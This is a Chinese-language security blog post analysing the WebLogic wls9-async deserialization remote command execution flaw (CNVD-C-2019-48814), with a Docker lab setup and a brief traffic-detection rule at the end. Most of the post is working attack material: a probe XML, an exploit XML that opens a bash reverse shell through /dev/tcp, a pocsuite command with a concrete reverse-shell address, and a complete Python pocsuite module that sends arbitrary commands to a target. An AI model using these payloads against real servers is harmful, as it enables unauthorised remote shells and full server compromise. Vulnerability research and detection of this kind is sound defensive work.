_posts/2019-8-2-CNVDC201948814.md

---
layout: post
title:  "weblogic 远程命令执行漏洞分析 (CNVD-C-2019-48814)"
date:   2019-8-2 16:18:43
categories: Development
author: co0ontty
categories: 安全开发 漏洞复现 ALL
tags: 安全开发 漏洞复现 ALL
describe: weblogic 远程命令执行漏洞分析
cover: '/assets/img/posts/0d543f9aec58561aabc164648a1809d8.png'
---

## weblogic 远程命令执行漏洞  (CNVD-C-2019-48814）

### 漏洞概述

该漏洞存在于 wls9-async 组件，这个组件主要作用是异步通讯服务，攻击者可以向 /_async/AsyncResponseService 路径下传入构造好的恶意 xml 格式的数据，传入的数据在服务器端反序列化时，执行其中的恶意代码，从而可以 getshell。

### 漏洞环境搭建

docker 快速启动：

```bash
docker pull ismaleiva90/weblogic12

docker run -d -p 7001:7001 -p 7002:7002 --restart=always ismaleiva90/weblogic12:latest
```

访问：ip:7001/_async/AsyncResponseService 查看 wls9-async 组件是否启动成功
![avatar](/assets/img/posts/20190426101059760.png)
nmap 检测插件 [weblogic.nse](https://github.com/Rvn0xsy/nse_vuln/tree/master/weblogic/CNVD-C-2019-4814) 

### 漏洞复现

#### Poc：

向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml：

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="POC">
<array class="xx" length="0">
</array>
<void method="start"/>
</void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body>
</soapenv:Envelope>
```

如果 res.status_code == 202 则可以判断存在漏洞

#### Exp：

向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml：

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

#### Pocsuite
```bash
pocsuite -r 1000255.py -u 172.16.5.162 --extra-params="{'cmd':'bash -i &gt;&amp; /dev/tcp/172.16.5.1/1136 0&gt;&amp;1'}"
```
```py
#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.request import req
from pocsuite.lib.core.data import logger
from urlparse import urlparse, urljoin
from pocsuite.lib.core.enums import CUSTOM_LOGGING
import urllib


class TestPOC(POCBase):
    vulID = '97920'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = '2019-8-1'
    createDate = '2019-8-1'
    updateDate = '2019-8-1'
    references = ['https://www.seebug.org/vuldb/ssvid-97920']
    name = 'WebLogic wls9-async反序列化远程命令执行'
    appPowerLink = 'https://www.oracle.com/middleware/technologies/weblogic.html'
    appName = 'WebLogic wls9-async'
    appVersion = 'WebLogic 10.*、12.1.3.0'
    vulType = '命令执行'
    desc = '''
        CNVD-C-2019-48814 漏洞主要是利用了 WebLogic 中的 wls9-async 组件，攻击者可以在
/_async/AsyncResponseService 路径下传入恶意的xml格式的数据，传入的数据在服务器端反序列化时，执行其中的恶意代码，实现远程命令执行，攻击者可以进而获得整台服务器的权限。
    '''
    samples = ['']
    install_requires = ['']

    def _attack(self):
        '''verify mode'''
        result = {}
        base_url = self.url
        port = urlparse(base_url).port
        if port is None:
            base_url = self.url + ":7001"
        path = "/_async/AsyncResponseService"
        vul_url = urljoin(base_url, path)

        status_code = req.get(vul_url).status_code

        if status_code == 200:
            if 'cmd' not in self.params:
                logger.log(CUSTOM_LOGGING.SYSINFO,
                           "You can use --extra-params=\"{'cmd': 'xxx'}\" to exec command")
                cmd = 'whoami'
                # cmd = "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"
            else:
                cmd = self.params['cmd']
            payload = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
            <soapenv:Header> 
            <wsa:Action>xx</wsa:Action>
            <wsa:RelatesTo>xx</wsa:RelatesTo>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
            <void index="0">
            <string>/bin/bash</string>
            </void>
            <void index="1">
            <string>-c</string>
            </void>
            <void index="2">
            <string>{}</string>
            </void>
            </array>
            <void method="start"/></void>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
            <asy:onAsyncDelivery/>
            </soapenv:Body></soapenv:Envelope>
            '''.format(cmd)

            sent_poc_header = {
                "Content-type": "text/xml"
            }
            sent_poc = req.post(vul_url, headers=sent_poc_header, data=payload)
            if sent_poc.status_code == 202:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
            return self.parse_output(result)

    _verify = _attack

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
```

### 流量检测

规则：通过检测目标对 /_async/AsyncResponseService 目录的请求，确定目标请求使用存在漏洞的组件，如果在对 /_async/AsyncResponseService 的请求中存在 content-type 为 ‘text/xml’ 的请求且请求内容存在  `<soapenv><soapenv/>` (\<soapenv>用于创建自定义命名空间)则判定存在攻击行为 
